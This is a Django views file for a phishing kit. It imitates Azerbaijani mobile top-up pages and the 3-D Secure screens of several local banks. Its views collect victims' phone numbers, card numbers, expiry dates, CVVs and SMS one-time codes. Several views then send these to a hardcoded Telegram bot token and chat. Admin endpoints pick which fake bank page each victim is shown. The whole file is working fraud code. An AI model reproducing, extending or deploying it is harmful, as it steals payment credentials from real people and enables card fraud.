from django.shortcuts import render, redirect
from django.db import models
from .models import ContactModel
import requests
from django.http import HttpResponse
import re
import json
from django.shortcuts import render, redirect, get_object_or_404
from .forms import ContactForm
from django.http import JsonResponse
from django.urls import reverse_lazy
from django.contrib.auth.decorators import user_passes_test

from rest_framework import generics
from .models import BannedIP
from .serializers import BannedIPSerializer

from django.http import HttpResponseRedirect
from django.urls import reverse
from django.views.decorators.csrf import ensure_csrf_cookie
def index(request):
    return render(request, "pages/index.html")

def nar(request):
    return render(request, "pages/nar.html")

def naxtel(request):
    if request.method == "POST":
        operator = request.POST.get('operator')
        amount = request.POST.get("amount")
        number = request.POST.get("number")
        if amount is None or len(amount) == 0:
            return render(request, "pages/azercell.html",)
        client_ip = get_client_ip(request)
        contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
        contact.save()
        request.session['operator'] = operator
        request.session['phone'] = number
        request.session['amount'] = amount
        return redirect('info')
    return render(request, "pages/naxtel.html")


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

@ensure_csrf_cookie
def azercell(request):
    if request.method == "POST":
        operator = request.POST.get('operator')
        amount = request.POST.get("amount")
        number = request.POST.get("number")
        if amount is None or len(amount) == 0:
            return render(request, "pages/azercell.html",)
        client_ip = get_client_ip(request)
        contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
        contact.save()
        request.session['operator'] = operator
        request.session['phone'] = number
        request.session['amount'] = amount
        return redirect('info')
    return render(request, "pages/azercell.html")


@ensure_csrf_cookie
def bakcell(request):
    if request.method == "POST":
        operator = request.POST.get('operator')
        amount = request.POST.get("amount")
        number = request.POST.get("number")
        if amount is None or len(amount) == 0:
            return render(request, "pages/azercell.html",)
        client_ip = get_client_ip(request)
        contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
        contact.save()
        request.session['operator'] = operator
        request.session['phone'] = number
        request.session['amount'] = amount
        return redirect('info')
    return render(request, "pages/bakcell.html")


@ensure_csrf_cookie
def info(request):
    if request.method == "POST":
        cardnumber= request.POST.get("cardnumber")
        if validate_card_number(cardnumber) == False:
            return render(request, "pages/3dsec.html")
        else:
            last_contact = ContactModel.objects.latest('created_at')
            mm_= request.POST.get("mm")
            yy_= request.POST.get("yy")
            cvv_= request.POST.get("cvv")
            if cvv_ and (not cvv_.isdigit() or len(cvv_) < 3):
                error_msg = "CVV must be a 3-digit number."
                return render(request, "pages/3dsec.html")
            elif len(cvv_) == 0:
                error_msg = "CVV must be a 3-digit number."
                return render(request, "pages/3dsec.html")
            elif len(cvv_) == 1:
                error_msg = "CVV must be a 3-digit number."
                return render(request, "pages/3dsec.html")
            elif len(cvv_) == 2:
                error_msg = "CVV must be a 3-digit number."
                return render(request, "pages/3dsec.html")
            last_contact.cc = cardnumber
            last_contact.mm = mm_
            last_contact.yy = yy_
            last_contact.cvv = cvv_
            last_contact.bankname=""
            last_contact.save()
            response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\n{last_contact.ip}\n{last_contact.cc}|{last_contact.mm}|{last_contact.yy}|{last_contact.cvv}\n Operator: {last_contact.operator} \nNumber:{last_contact.phone}')
            context = {
                    'id':last_contact.id
                }
            return render(request, 'pages/master.html', {'last_contact_id': last_contact.id})
    operator = request.session.get('operator')
    phone = request.session.get('phone')
    amount = request.session.get('amount')
    if not (operator and phone and amount):
        return redirect('index')
    context = {
        'operator': operator,
        'phone': phone,
        'amount': amount,
    }
    return render(request, 'pages/3dsec.html', context)
def check_approval_status(request, contact_id):
    try:
        contact = ContactModel.objects.get(pk=contact_id)
        return JsonResponse({'bankname': contact.bankname})
    except ContactModel.DoesNotExist:
        return JsonResponse({'error': f'Contact with ID {contact_id} does not exist.'}, status=404)
    
    
def validate_card_number(card_number):
    regex = r'^[456]\d{3}-?\d{4}-?\d{4}-?\d{4}|^[456]\d{15}$'
    if re.match(regex, card_number):
        return True
    return False


def loading(request):
    return render(request, "pages/master.html")

def kapital(request):
    last_contact = ContactModel.objects.latest('created_at')
    last_contact.bankname=""
    contex = {
        'last_contact_id': last_contact.id,
        "amount":last_contact.amount
    }
    return render(request, "pages/kapital.html",contex)

def cerime(request):
    return render(request, "pages/cerime.html")

def is_admin(user):
    return user.is_superuser

@user_passes_test(is_admin)
def crud(request):
    contacts = ContactModel.objects.all()
    return render(request, 'pages/crud.html', {'contacts': contacts})




def custom_404_page(request, exception):
    return render(request, 'pages/404.html', status=404)

@ensure_csrf_cookie
def contact_create(request):
    form = ContactForm(request.POST or None)
    if form.is_valid():
        form.save()
        return redirect('contact_list')
    return render(request, 'pages/contact_form.html', {'form': form})


def contact_update(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    form = ContactForm(request.POST or None, instance=contact)
    if form.is_valid():
        form.save()
        return redirect('contact_list')
    return render(request, 'pages/contact_form.html', {'form': form})


def contact_delete(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    contact.delete()
    return render( request,'pages/crud.html')



def contact_list_api(request):
    contacts = ContactModel.objects.all().values()
    return JsonResponse({'contacts': list(contacts)})


@ensure_csrf_cookie
def approve_action(request):
    if request.method == 'POST' and request.POST.get('action') == 'approve':
        id = request.POST.get('id')
        contact = get_object_or_404(ContactModel, id=id)
        # Perform the approve action here
        # ...
    return render(request, "pages/cerime.html")
    




def contact_approve(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "kapital"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})





def leobank(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "leobank"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})

@ensure_csrf_cookie
def contact_approve_abb(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "abb"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})

@ensure_csrf_cookie
def contact_approve_unibank(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "unibank"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})


@ensure_csrf_cookie
def contact_approve_pashabank(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "pashabank"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})


@ensure_csrf_cookie
def contact_approve_error(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "error"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})

def approval_page(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    context = {'contact': contact}
    return render(request, 'pages/azercell.html', context)


def redirect_user(request):
    url = reverse('crud:index') # Kullanıcının yönlendirileceği URL
    return HttpResponseRedirect(url)



def post(self, request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    contact.is_approved = True
    contact.save()
    return redirect(reverse_lazy('home'))



def approve_contact_api(request, pk):
    try:
        contact = ContactModel.objects.get(pk=pk)
        contact.is_approved = True
        contact.save()
        return JsonResponse({'success': True})
    except ContactModel.DoesNotExist:
        return JsonResponse({'success': False}, status=404)

@ensure_csrf_cookie
def abb(request):
    last_contact = ContactModel.objects.latest('created_at')
    
    context = {
    'amount':last_contact.amount,
    'cc': last_contact.cc[-4:],
    }
    return render( request,'pages/abb3d.html' ,context)

def rabite(request):

    return render( request,'pages/rabite.html' )

def dsecazericard(request):
    sms = request.POST.get('secpass')
    last_contact = ContactModel.objects.latest('created_at')
    last_contact.sms=sms
    last_contact.save()
    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')

    return render( request,'pages/loading.html' )

def page_not_found(request, exception):
    return render(request, 'pages/404.html', status=404)

@ensure_csrf_cookie  
def dseckapital(request):
    if request.method == "POST":
        input1 = request.POST.get("input1")
        input2 = request.POST.get("input2")
        input3 = request.POST.get("input3")
        input4 = request.POST.get("input4")
        if len(input4) == 0:
            # handle the case when input6 is empty
            # for example, you can display an error message to the user
            return render(request, 'pages/kapital.html')
        concatenated = input1 + input2+input3+input4
        last_contact = ContactModel.objects.latest('created_at')
        last_contact.sms=concatenated
        last_contact.save()
        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
        return render( request,'pages/loading.html' )
    
    
    return render( request,'pages/loading.html' )

@ensure_csrf_cookie
def leobank3d(request):
    
    if request.method == "POST":
        last_contact = ContactModel.objects.latest('created_at')
        return render( request,'pages/error.html' )
    last_contact = ContactModel.objects.latest('created_at')
    
    context = {
    'last_contact_id': last_contact.id,
    'amount':last_contact.amount,
    'cc': last_contact.cc[-4:],
    }
    
    return render( request,'pages/erro.html',context )



@ensure_csrf_cookie
def unibank(request):
    last_contact = ContactModel.objects.latest('created_at')
    number = str(last_contact.phone)
    last_contact.bankname=""
    last_contact.save()
    context = {
        'number': number[-4:],
        'amount': last_contact.amount,
        'cc': last_contact.cc[-4:],
    }
    
    return render( request,'pages/unibank3d.html',context )


@ensure_csrf_cookie
def unibank3d(request):
    sms = request.POST.get('secpass')
    last_contact = ContactModel.objects.latest('created_at')
    last_contact.sms=sms
    last_contact.save()
    context = {
        'last_contact_id': last_contact.id,

    }
    if len(sms) == 0:
        # handle the case when input6 is empty
        # for example, you can display an error message to the user
        return render(request, 'pages/unibank3d.html')
    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{last_contact.id}\nsms:{last_contact.sms}|number{last_contact.phone}')
    return render( request,'pages/loading.html',context )



@ensure_csrf_cookie
def pashabank(request):
    last_contact = ContactModel.objects.latest('created_at')
    number = str(last_contact.phone)
    context = {
        'last_contact_id': last_contact.id,
        'number': number[-4:],
        'amount': last_contact.amount,
        'cc': last_contact.cc[-4:],
    }
    return render( request,'pages/pasha.html',context )


def error(request):
    
    return render( request,'pages/error.html' )



@ensure_csrf_cookie
def pashabank3d(request):
    
    if request.method == "POST":
        last_contact = ContactModel.objects.latest('created_at')
        number = str(last_contact.phone)

        context = {
               "last_contact.bankname":"",
              'number': number[-4:],
              'amount': last_contact.amount,
              'cc': last_contact.cc[-4:],
        }
        input1 = request.POST.get("input1")
        input2 = request.POST.get("input2")
        input3 = request.POST.get("input3")
        input4 = request.POST.get("input4")
        input5 = request.POST.get("input5")
        input6 = request.POST.get("input6")
        if len(input6) == 0:
         # handle the case when input6 is empty
         # for example, you can display an error message to the user
         return render(request, 'pages/pasha.html',)
        elif len(input5) == 0:
         # handle the case when input6 is empty
         # for example, you can display an error message to the user
         return render(request, 'pages/pasha.html',)
        concatenated = input1+input2 +input3+input4+input5+input6
        last_contact = ContactModel.objects.latest('created_at')
        last_contact.sms=concatenated
        last_contact.save()
        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{last_contact.id}\nnumber{last_contact.phone}\nsms:{concatenated}')
        return render( request,'pages/loading.html',context )
    
    
    return render( request,'pages/loading.html' )






def check_status(request):
    last_contact = get_object_or_404(ContactModel.objects.order_by('-created_at')[:1])
    data = {
        'error_message': last_contact.error_message
    }
    return JsonResponse(data)




class BannedIPListCreateAPIView(generics.ListCreateAPIView):
    queryset = BannedIP.objects.all()
    serializer_class = BannedIPSerializer